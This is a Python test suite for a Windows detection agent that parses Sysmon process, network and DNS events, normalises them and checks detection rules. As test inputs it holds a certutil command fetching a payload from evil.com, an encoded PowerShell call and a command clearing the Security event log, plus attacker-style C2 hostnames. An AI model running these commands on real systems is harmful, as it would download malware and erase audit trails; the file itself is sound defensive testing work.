import unittest
from unittest import mock
import os
import json
import tempfile
import shutil
import logging
import jsonschema
from typing import Dict, Any

from collectors.windows_event_collector import WindowsEventCollector
from normalizer.windows_event_normalizer import WindowsEventNormalizer
from core.agent_identity import AgentIdentity
from detection.detector import DetectionEngine
from detection.rules import (
    SuspiciousPowerShellRule,
    SuspiciousLolbinsDownloadRule,
    ReconnaissanceCommandsRule,
    DefenseEvasionRule,
)
from pipeline import WindowsDetectionPipeline
from output.builder import DetectionEventBuilder
from config.settings import config
from canonical import generate_source_event_id_v2

SYSMON_EVENT_1_XML = """
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-11-19T10:00:00.000000000Z"/>
    <EventRecordID>1001</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2048" ThreadID="3000"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-EMP-01</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-11-19 10:00:00.000</Data>
    <Data Name="ProcessGuid">{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}</Data>
    <Data Name="ProcessId">4560</Data>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="FileVersion">10.0.19041.1</Data>
    <Data Name="Description">Windows PowerShell</Data>
    <Data Name="Product">Microsoft® Windows® Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">PowerShell.EXE</Data>
    <Data Name="CommandLine">powershell.exe -enc SQBFAFgA</Data>
    <Data Name="CurrentDirectory">C:\\Users\\alice\\</Data>
    <Data Name="User">CORP\\alice</Data>
    <Data Name="LogonGuid">{12345678-ABCD-EF01-2345-6789ABCDEF01}</Data>
    <Data Name="LogonId">0x3e7</Data>
    <Data Name="TerminalSessionId">1</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">SHA1=B2636257E42531393698B9EE608AD9F3,MD5=65B1D28C2B3F026FB6A611B21EE98B23,SHA256=A1B2C3D4E5F60718293A4B5C6D7E8F90A1B2C3D4E5F60718293A4B5C6D7E8F90,IMPHASH=259F818D27C218EEB51EFA87B95B94A7</Data>
    <Data Name="ParentProcessGuid">{F0E1D2C3-B4A5-9687-0123-456789ABCDEF}</Data>
    <Data Name="ParentProcessId">1024</Data>
    <Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>
    <Data Name="ParentCommandLine">C:\\Windows\\Explorer.EXE</Data>
    <Data Name="ParentUser">CORP\\alice</Data>
  </EventData>
</Event>
"""

SYSMON_EVENT_3_XML = """
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
    <EventID>3</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>3</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-11-19T10:05:00.000000000Z"/>
    <EventRecordID>1002</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2048" ThreadID="3000"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-EMP-01</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-11-19 10:05:00.000</Data>
    <Data Name="ProcessGuid">{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}</Data>
    <Data Name="ProcessId">4560</Data>
    <Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>
    <Data Name="User">CORP\\alice</Data>
    <Data Name="Protocol">tcp</Data>
    <Data Name="Initiated">true</Data>
    <Data Name="SourceIsIpv6">false</Data>
    <Data Name="SourceIp">192.168.1.50</Data>
    <Data Name="SourceHostname">WIN-EMP-01.corp.local</Data>
    <Data Name="SourcePort">49152</Data>
    <Data Name="SourcePortName">-</Data>
    <Data Name="DestinationIsIpv6">false</Data>
    <Data Name="DestinationIp">10.0.0.99</Data>
    <Data Name="DestinationHostname">c2.attacker.com</Data>
    <Data Name="DestinationPort">443</Data>
    <Data Name="DestinationPortName">https</Data>
  </EventData>
</Event>
"""

SYSMON_EVENT_22_XML = """
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
    <EventID>22</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>22</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-11-19T10:10:00.000000000Z"/>
    <EventRecordID>1003</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2048" ThreadID="3000"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-EMP-01</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-11-19 10:10:00.000</Data>
    <Data Name="ProcessGuid">{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}</Data>
    <Data Name="ProcessId">4560</Data>
    <Data Name="QueryName">malicious-c2.example.com</Data>
    <Data Name="QueryStatus">0</Data>
    <Data Name="QueryResults">::ffff:198.51.100.24;198.51.100.25;</Data>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="User">CORP\\alice</Data>
  </EventData>
</Event>
"""


class TestSysmonXmlParsing(unittest.TestCase):
    def setUp(self):
        self.logger = logging.getLogger("TestSysmonXml")
        self.collector = WindowsEventCollector(
            self.logger, log_name="Microsoft-Windows-Sysmon/Operational"
        )

    def test_parse_sysmon_event_1_process_creation(self):
        events = self.collector._parse_wevtutil_xml(SYSMON_EVENT_1_XML)
        self.assertEqual(len(events), 1)
        ev = events[0]

        # System fields
        self.assertEqual(ev["event_id"], 1)
        self.assertEqual(ev["record_id"], 1001)
        self.assertEqual(ev["computer"], "WIN-EMP-01")
        self.assertEqual(ev["channel"], "Microsoft-Windows-Sysmon/Operational")
        self.assertEqual(ev["provider"], "Microsoft-Windows-Sysmon")
        self.assertEqual(ev["timestamp"], "2026-11-19T10:00:00.000000000Z")

        # Process metadata
        self.assertEqual(ev["process_guid"], "{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}")
        self.assertEqual(ev["process_id"], "4560")
        self.assertEqual(ev["process_name"], "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
        self.assertEqual(ev["command_line"], "powershell.exe -enc SQBFAFgA")
        self.assertEqual(ev["current_directory"], "C:\\Users\\alice\\")
        self.assertEqual(ev["user"], "CORP\\alice")
        self.assertEqual(ev["username"], "alice")
        self.assertEqual(ev["integrity_level"], "Medium")

        # Hashes
        self.assertIn("hashes", ev)
        self.assertEqual(ev["sha256"], "A1B2C3D4E5F60718293A4B5C6D7E8F90A1B2C3D4E5F60718293A4B5C6D7E8F90")
        self.assertEqual(ev["md5"], "65B1D28C2B3F026FB6A611B21EE98B23")
        self.assertEqual(ev["sha1"], "B2636257E42531393698B9EE608AD9F3")
        self.assertEqual(ev["imphash"], "259F818D27C218EEB51EFA87B95B94A7")

        # Parent process metadata
        self.assertEqual(ev["parent_process_guid"], "{F0E1D2C3-B4A5-9687-0123-456789ABCDEF}")
        self.assertEqual(ev["parent_process_id"], "1024")
        self.assertEqual(ev["parent_process_name"], "C:\\Windows\\explorer.exe")
        self.assertEqual(ev["parent_command_line"], "C:\\Windows\\Explorer.EXE")
        self.assertEqual(ev["parent_user"], "CORP\\alice")

        # Software metadata
        self.assertEqual(ev["original_file_name"], "PowerShell.EXE")
        self.assertEqual(ev["file_version"], "10.0.19041.1")
        self.assertEqual(ev["description"], "Windows PowerShell")

    def test_parse_sysmon_event_3_network_connection(self):
        events = self.collector._parse_wevtutil_xml(SYSMON_EVENT_3_XML)
        self.assertEqual(len(events), 1)
        ev = events[0]

        self.assertEqual(ev["event_id"], 3)
        self.assertEqual(ev["record_id"], 1002)
        self.assertEqual(ev["source_ip"], "192.168.1.50")
        self.assertEqual(ev["destination_ip"], "10.0.0.99")
        self.assertEqual(ev["source_port"], 49152)
        self.assertEqual(ev["destination_port"], 443)
        self.assertEqual(ev["protocol"], "tcp")
        self.assertTrue(ev["initiated"])
        self.assertEqual(ev["process_name"], "C:\\Windows\\System32\\cmd.exe")
        self.assertEqual(ev["user"], "CORP\\alice")
        self.assertEqual(ev["username"], "alice")

    def test_parse_sysmon_event_22_dns_query(self):
        events = self.collector._parse_wevtutil_xml(SYSMON_EVENT_22_XML)
        self.assertEqual(len(events), 1)
        ev = events[0]

        self.assertEqual(ev["event_id"], 22)
        self.assertEqual(ev["record_id"], 1003)
        self.assertEqual(ev["query_name"], "malicious-c2.example.com")
        self.assertEqual(ev["query_status"], 0)
        self.assertEqual(ev["query_results"], "::ffff:198.51.100.24;198.51.100.25;")
        self.assertEqual(ev["process_name"], "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")

    def test_parse_hashes_helper(self):
        # Empty and none handling
        self.assertEqual(WindowsEventCollector._parse_hashes(None), {})
        self.assertEqual(WindowsEventCollector._parse_hashes(""), {})
        self.assertEqual(WindowsEventCollector._parse_hashes("-"), {})

        # Standard multi-algorithm string
        raw = "MD5=ABC,SHA256=DEF,IMPHASH=123"
        parsed = WindowsEventCollector._parse_hashes(raw)
        self.assertEqual(parsed, {"md5": "ABC", "sha256": "DEF", "imphash": "123"})

        # Extra whitespace and malformed token handling
        raw_whitespace = " MD5 = ABC , SHA256=DEF , BADTOKEN , IMPHASH = 123 "
        parsed_ws = WindowsEventCollector._parse_hashes(raw_whitespace)
        self.assertEqual(parsed_ws.get("md5"), "ABC")
        self.assertEqual(parsed_ws.get("sha256"), "DEF")
        self.assertEqual(parsed_ws.get("imphash"), "123")
        self.assertNotIn("badtoken", parsed_ws)


class TestSysmonNormalizer(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.logger = logging.getLogger("TestSysmonNorm")
        cls.temp_dir = tempfile.TemporaryDirectory()
        cls.identity = AgentIdentity(data_dir=cls.temp_dir.name)

        schema_path = os.path.join(
            os.path.dirname(__file__),
            "..", "..", "docs", "contracts", "normalized_event_contract_v1.schema.json"
        )
        with open(schema_path, "r", encoding="utf-8") as f:
            cls.schema = json.load(f)

    @classmethod
    def tearDownClass(cls):
        cls.temp_dir.cleanup()

    def setUp(self):
        self.collector = WindowsEventCollector(
            self.logger, log_name="Microsoft-Windows-Sysmon/Operational"
        )
        self.normalizer = WindowsEventNormalizer(self.identity, self.logger)

    def test_normalize_sysmon_event_1_schema_and_types(self):
        raw_events = self.collector._parse_wevtutil_xml(SYSMON_EVENT_1_XML)
        norm = self.normalizer.normalize(
            raw_events[0], log_name="Microsoft-Windows-Sysmon/Operational", epoch=1
        )

        # 1. Full JSONSchema contract validation
        jsonschema.validate(instance=norm, schema=self.schema)

        # 2. Top-level contract properties
        self.assertEqual(norm["event_type"], "windows_process_event")
        self.assertEqual(norm["agent_id"], self.identity.agent_id)
        self.assertEqual(norm["hostname"], "WIN-EMP-01")
        self.assertEqual(norm["os"], "Windows")
        self.assertEqual(norm["username"], "alice")
        self.assertEqual(norm["severity"], "low")
        self.assertIsNone(norm["detection_type"])
        self.assertIsNone(norm["confidence"])

        # 3. Evidence preservation
        ev = norm["evidence"]
        self.assertEqual(ev["sysmon_event_id"], 1)
        self.assertEqual(ev["windows_event_id"], 1)
        self.assertEqual(ev["process_guid"], "{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}")
        self.assertEqual(ev["process_name"], "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
        self.assertEqual(ev["command_line"], "powershell.exe -enc SQBFAFgA")
        self.assertEqual(ev["integrity_level"], "Medium")
        self.assertEqual(ev["sha256"], "A1B2C3D4E5F60718293A4B5C6D7E8F90A1B2C3D4E5F60718293A4B5C6D7E8F90")
        self.assertEqual(ev["md5"], "65B1D28C2B3F026FB6A611B21EE98B23")
        self.assertEqual(ev["parent_process_name"], "C:\\Windows\\explorer.exe")
        self.assertEqual(ev["parent_process_id"], "1024")

        # 4. Identity attributes
        self.assertEqual(ev["domain_status"], "OBSERVED_DOMAIN")
        self.assertEqual(ev["target_account_id"], "DOMAIN:CORP\\alice")

    def test_normalize_sysmon_event_3_network(self):
        raw_events = self.collector._parse_wevtutil_xml(SYSMON_EVENT_3_XML)
        norm = self.normalizer.normalize(
            raw_events[0], log_name="Microsoft-Windows-Sysmon/Operational", epoch=1
        )

        jsonschema.validate(instance=norm, schema=self.schema)
        self.assertEqual(norm["event_type"], "windows_network_event")
        self.assertEqual(norm["source_ip"], "192.168.1.50")

        ev = norm["evidence"]
        self.assertEqual(ev["sysmon_event_id"], 3)
        self.assertEqual(ev["destination_ip"], "10.0.0.99")
        self.assertEqual(ev["destination_port"], 443)
        self.assertEqual(ev["source_port"], 49152)
        self.assertEqual(ev["protocol"], "tcp")
        self.assertTrue(ev["initiated"])
        self.assertEqual(ev["process_name"], "C:\\Windows\\System32\\cmd.exe")

    def test_normalize_sysmon_event_22_dns(self):
        raw_events = self.collector._parse_wevtutil_xml(SYSMON_EVENT_22_XML)
        norm = self.normalizer.normalize(
            raw_events[0], log_name="Microsoft-Windows-Sysmon/Operational", epoch=1
        )

        jsonschema.validate(instance=norm, schema=self.schema)
        self.assertEqual(norm["event_type"], "windows_dns_event")

        ev = norm["evidence"]
        self.assertEqual(ev["sysmon_event_id"], 22)
        self.assertEqual(ev["query_name"], "malicious-c2.example.com")
        self.assertEqual(ev["query_status"], 0)
        self.assertEqual(ev["query_results"], "::ffff:198.51.100.24;198.51.100.25;")

    def test_channel_isolation_source_event_ids_differ(self):
        # A Security event and a Sysmon event with identical record IDs must NOT produce colliding event_ids
        raw_sec = {"record_id": 500, "timestamp": "2026-11-19T10:00:00Z", "computer": "PC1"}
        raw_sys = {"record_id": 500, "timestamp": "2026-11-19T10:00:00Z", "computer": "PC1"}

        norm_sec = self.normalizer.normalize(raw_sec, log_name="Security", epoch=1)
        norm_sys = self.normalizer.normalize(
            raw_sys, log_name="Microsoft-Windows-Sysmon/Operational", epoch=1
        )

        self.assertNotEqual(norm_sec["event_id"], norm_sys["event_id"])


class TestSysmonDetection(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.logger = logging.getLogger("TestSysmonDet")
        cls.temp_dir = tempfile.TemporaryDirectory()
        cls.identity = AgentIdentity(data_dir=cls.temp_dir.name)
        cls.normalizer = WindowsEventNormalizer(cls.identity, cls.logger)
        cls.engine = DetectionEngine(cls.logger)
        cls.collector = WindowsEventCollector(
            cls.logger, log_name="Microsoft-Windows-Sysmon/Operational"
        )

    @classmethod
    def tearDownClass(cls):
        cls.temp_dir.cleanup()

    def test_sysmon_event_1_triggers_powershell_rule(self):
        raw_events = self.collector._parse_wevtutil_xml(SYSMON_EVENT_1_XML)
        norm = self.normalizer.normalize(
            raw_events[0], log_name="Microsoft-Windows-Sysmon/Operational", epoch=1
        )

        results = self.engine.process_event(norm)
        # Should detect PowerShell EncodedCommand
        det_types = [r.detection_type for r in results if r.detected]
        self.assertIn("windows_powershell_execution", det_types)

        # Build DetectionEvent and verify Sysmon evidence survives
        ps_result = next(r for r in results if r.detection_type == "windows_powershell_execution")
        det_event = DetectionEventBuilder.build(norm, ps_result)
        self.assertIsNotNone(det_event)
        self.assertEqual(det_event.evidence["sysmon_event_id"], 1)
        self.assertEqual(det_event.evidence["sha256"], "A1B2C3D4E5F60718293A4B5C6D7E8F90A1B2C3D4E5F60718293A4B5C6D7E8F90")
        self.assertEqual(det_event.evidence["integrity_level"], "Medium")

    def test_sysmon_event_1_triggers_lolbin_download_rule(self):
        xml_certutil = SYSMON_EVENT_1_XML.replace(
            "powershell.exe -enc SQBFAFgA",
            "certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe"
        ).replace("PowerShell.EXE", "CertUtil.EXE")

        raw_events = self.collector._parse_wevtutil_xml(xml_certutil)
        norm = self.normalizer.normalize(
            raw_events[0], log_name="Microsoft-Windows-Sysmon/Operational", epoch=1
        )

        results = self.engine.process_event(norm)
        det_types = [r.detection_type for r in results if r.detected]
        self.assertIn("windows_lolbin_download", det_types)

    def test_sysmon_event_1_triggers_reconnaissance_rule(self):
        xml_whoami = SYSMON_EVENT_1_XML.replace(
            "powershell.exe -enc SQBFAFgA",
            "whoami.exe /priv"
        )
        raw_events = self.collector._parse_wevtutil_xml(xml_whoami)
        norm = self.normalizer.normalize(
            raw_events[0], log_name="Microsoft-Windows-Sysmon/Operational", epoch=1
        )

        results = self.engine.process_event(norm)
        det_types = [r.detection_type for r in results if r.detected]
        self.assertIn("windows_reconnaissance", det_types)

    def test_sysmon_event_1_triggers_defense_evasion_rule(self):
        xml_evasion = SYSMON_EVENT_1_XML.replace(
            "powershell.exe -enc SQBFAFgA",
            "wevtutil.exe cl security"
        )
        raw_events = self.collector._parse_wevtutil_xml(xml_evasion)
        norm = self.normalizer.normalize(
            raw_events[0], log_name="Microsoft-Windows-Sysmon/Operational", epoch=1
        )

        results = self.engine.process_event(norm)
        det_types = [r.detection_type for r in results if r.detected]
        self.assertIn("windows_defense_evasion", det_types)


class TestSysmonPipelineMultichannel(unittest.TestCase):
    def setUp(self):
        self.test_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.test_dir, "outbox.db")
        self.state_dir = os.path.join(self.test_dir, "state")
        self.det_dir = os.path.join(self.test_dir, "detections")

        self.orig_data_dir = config.data_dir
        self.orig_outbox = config.outbox_db_path
        self.orig_checkpoint = config.checkpoint_dir
        self.orig_detection = config.detection_output_dir

        config.data_dir = self.test_dir
        config.outbox_db_path = self.db_path
        config.checkpoint_dir = self.state_dir
        config.detection_output_dir = self.det_dir

    def tearDown(self):
        config.data_dir = self.orig_data_dir
        config.outbox_db_path = self.orig_outbox
        config.checkpoint_dir = self.orig_checkpoint
        config.detection_output_dir = self.orig_detection
        shutil.rmtree(self.test_dir, ignore_errors=True)

    def test_multichannel_batch_processing_and_independent_checkpoints(self):
        logger = logging.getLogger("TestMultichannelPipeline")
        logger.setLevel(logging.INFO)
        config.ensure_directories()

        pipeline = WindowsDetectionPipeline(logger)
        pipeline.collector.initialize()
        self.assertIsNotNone(pipeline.sysmon_collector)
        pipeline.sysmon_collector.initialize()

        # Seed initial checkpoints
        pipeline.collector.checkpoint_manager.save_checkpoint(500)
        pipeline.collector.current_checkpoint = 500
        pipeline.sysmon_collector.checkpoint_manager.save_checkpoint(1000)
        pipeline.sysmon_collector.current_checkpoint = 1000

        # Drop simulated Security XML event into Security collector directory
        sec_xml = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4624</EventID>
    <EventRecordID>501</EventRecordID>
    <Channel>Security</Channel>
    <Computer>WIN-EMP-01</Computer>
    <TimeCreated SystemTime="2026-11-19T10:00:00Z"/>
  </System>
  <EventData><Data Name="TargetUserName">bob</Data></EventData>
</Event>"""
        sec_path = os.path.join(pipeline.collector.simulated_events_channel_dir, "sec_501.xml")
        with open(sec_path, "w", encoding="utf-8") as f:
            f.write(sec_xml)

        # Drop simulated Sysmon XML event into Sysmon collector directory
        sys_xml = SYSMON_EVENT_1_XML.replace("<EventRecordID>1001</EventRecordID>", "<EventRecordID>1001</EventRecordID>")
        sys_path = os.path.join(pipeline.sysmon_collector.simulated_events_channel_dir, "sys_1001.xml")
        with open(sys_path, "w", encoding="utf-8") as f:
            f.write(sys_xml)

        # Execute batch
        pipeline.process_batch()

        # 1. Both checkpoints advanced independently to their own record IDs
        self.assertEqual(pipeline.collector.current_checkpoint, 501)
        self.assertEqual(pipeline.collector.checkpoint_manager.load_checkpoint(), 501)

        self.assertEqual(pipeline.sysmon_collector.current_checkpoint, 1001)
        self.assertEqual(pipeline.sysmon_collector.checkpoint_manager.load_checkpoint(), 1001)

        # 2. Outbox received detection event from Sysmon PowerShell execution
        pending = pipeline.outbox.get_pending_events(limit=10)
        self.assertGreaterEqual(len(pending), 1)
        payload = json.loads(pending[0]["event_data"])
        self.assertEqual(payload["detection_type"], "windows_powershell_execution")
        self.assertEqual(payload["evidence"]["sysmon_event_id"], 1)
        self.assertEqual(payload["evidence"]["sha256"], "A1B2C3D4E5F60718293A4B5C6D7E8F90A1B2C3D4E5F60718293A4B5C6D7E8F90")

    def test_pipeline_heartbeat_capabilities_include_sysmon_when_initialized(self):
        """When Sysmon is enabled and collector initializes successfully, all 3 Sysmon capabilities are present."""
        logger = logging.getLogger("TestCapabilities")
        pipeline = WindowsDetectionPipeline(logger)
        # Before initialization: Sysmon capabilities must be absent
        self.assertNotIn("Sysmon_Event1", pipeline.heartbeat_worker.capabilities)
        self.assertNotIn("Sysmon_Event3", pipeline.heartbeat_worker.capabilities)
        self.assertNotIn("Sysmon_Event22", pipeline.heartbeat_worker.capabilities)

        # Initialize Sysmon collector and refresh capabilities
        pipeline.collector.initialize()
        self.assertIsNotNone(pipeline.sysmon_collector)
        pipeline.sysmon_collector.initialize()
        caps = pipeline.refresh_capabilities()

        self.assertIn("Sysmon_Event1", caps)
        self.assertIn("Sysmon_Event3", caps)
        self.assertIn("Sysmon_Event22", caps)
        self.assertIn("EventLog_4625", caps)
        self.assertIn("EventLog_4688", caps)
        self.assertIn("BLOCK_SOURCE", caps)
        self.assertEqual(pipeline.heartbeat_worker.capabilities, caps)

    def test_pipeline_heartbeat_capabilities_sysmon_disabled(self):
        """When Sysmon collection is disabled, all Sysmon capabilities are absent, Security capabilities remain."""
        logger = logging.getLogger("TestCapsDisabled")
        orig_flag = config.enable_sysmon_collection
        try:
            config.enable_sysmon_collection = False
            pipeline = WindowsDetectionPipeline(logger)
            pipeline.collector.initialize()
            caps = pipeline.refresh_capabilities()

            self.assertIsNone(pipeline.sysmon_collector)
            self.assertNotIn("Sysmon_Event1", caps)
            self.assertNotIn("Sysmon_Event3", caps)
            self.assertNotIn("Sysmon_Event22", caps)
            self.assertIn("EventLog_4625", caps)
            self.assertIn("EventLog_4688", caps)
            self.assertIn("BLOCK_SOURCE", caps)
        finally:
            config.enable_sysmon_collection = orig_flag

    def test_pipeline_heartbeat_capabilities_sysmon_init_failure(self):
        """When Sysmon collector fails to initialize, Sysmon capabilities are absent, Security capabilities remain."""
        logger = logging.getLogger("TestCapsInitFail")
        pipeline = WindowsDetectionPipeline(logger)
        pipeline.collector.initialize()

        # Simulate Sysmon initialization failure
        with mock.patch.object(pipeline.sysmon_collector, "initialize", side_effect=RuntimeError("Sysmon channel unavailable")):
            try:
                pipeline.sysmon_collector.initialize()
            except Exception:
                pipeline.sysmon_collector.is_initialized = False

            caps = pipeline.refresh_capabilities()

            self.assertFalse(pipeline.sysmon_collector.is_initialized)
            self.assertNotIn("Sysmon_Event1", caps)
            self.assertNotIn("Sysmon_Event3", caps)
            self.assertNotIn("Sysmon_Event22", caps)
            self.assertIn("EventLog_4625", caps)
            self.assertIn("EventLog_4688", caps)
            self.assertIn("BLOCK_SOURCE", caps)

    def test_pipeline_capabilities_no_duplicates(self):
        """Effective capabilities must never contain duplicate entries."""
        logger = logging.getLogger("TestCapsNoDup")
        pipeline = WindowsDetectionPipeline(logger)
        caps_initial = pipeline.get_effective_capabilities()
        self.assertEqual(len(caps_initial), len(set(caps_initial)))

        pipeline.collector.initialize()
        if pipeline.sysmon_collector:
            pipeline.sysmon_collector.initialize()
        caps_initialized = pipeline.get_effective_capabilities()
        self.assertEqual(len(caps_initialized), len(set(caps_initialized)))


if __name__ == "__main__":
    unittest.main()
